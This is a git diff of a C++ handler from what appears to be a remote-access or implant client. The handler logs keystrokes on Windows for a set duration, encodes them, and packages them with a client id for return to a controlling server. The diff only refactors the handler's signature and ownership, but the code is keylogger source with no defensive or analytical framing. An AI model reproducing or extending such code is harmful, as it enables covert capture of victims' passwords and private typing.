@@ -13,7 +13,7 @@ KeyLogEventHandler::KeyLogEventHandler(const unsigned int duration)
 {
 }
 
-std::unique_ptr<IRequest> KeyLogEventHandler::handle(const std::shared_ptr<EventInfo> event_info,
+std::unique_ptr<IRequest> KeyLogEventHandler::handle(std::shared_ptr<EventInfo> event_info,
                                                      const std::string& client_id)
 {
 	const std::string result = windows::log_keys(m_duration);
@@ -21,8 +21,7 @@ std::unique_ptr<IRequest> KeyLogEventHandler::handle(const std::shared_ptr<Event
 	const std::string generated_command_id = uuid::generate_uuid();
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnEventProduct, client_id},
-		generated_command_id,
-		ReturnEventProduct(std::make_unique<KeyLogProduct>(generated_command_id, encoded_result),
-		                   event_info).serialize()
+		std::make_unique<ReturnEventProduct>(std::make_unique<KeyLogProduct>(generated_command_id, encoded_result),
+		                                     std::move(event_info))
 	);
 }
